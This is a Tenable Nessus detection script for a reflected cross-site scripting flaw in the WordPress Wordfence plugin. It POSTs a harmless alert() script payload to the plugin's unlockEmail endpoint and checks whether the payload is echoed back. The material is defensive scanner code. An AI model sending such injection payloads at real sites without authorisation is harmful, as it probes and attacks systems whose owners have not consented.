#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63064);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/12/12 19:19:06 $");

  script_bugtraq_id(56159);
  script_osvdb_id(86557);

  script_name(english:"Wordfence Plugin for WordPress 'email' Parameter XSS");
  script_summary(english:"Attempts to inject script code via the 'email' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Wordfence plugin for WordPress installed on the
remote host fails to properly sanitize user-supplied input to the
'email' parameter in the lib/wordfenceClass.php script. An
unauthenticated, remote attacker can exploit this issue, via a
specially crafted request, to execute arbitrary script code in a
user's browser session.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2012/Oct/139");
  script_set_attribute(attribute:"see_also", value:"https://www.wordfence.com/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Wordfence Plugin version 3.3.7 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Wordfence";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "wordfence/js/admin.js"][0] =
    make_list("window\['wordfenceAdmin'\]");

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

xss_test = '"<script>alert('+ "'" + SCRIPT_NAME + '-' + unixtime() + "'" +')</script>';
exp_output = '<p>We received a request to email "' + xss_test;

url_path = install['Redirect'];
if (!isnull(url_path))
{
  url = url_path;
  url = ereg_replace(string:url, pattern:"/$", replace:"");
}
else url = dir;

res2 = http_send_recv3(
  port         : port,
  method       : "POST",
  item         : url + '/index.php?_wfsf=unlockEmail',
  data         : 'email=' + urlencode(str:xss_test),
  add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);

if (exp_output >< res2[2])
{
  output = extract_pattern_from_resp(string:res2[2], pattern:'ST:'+exp_output);

  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 3,
    xss        : TRUE,  # Sets XSS KB key
    request    : make_list(http_last_sent_request()),
    output     : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
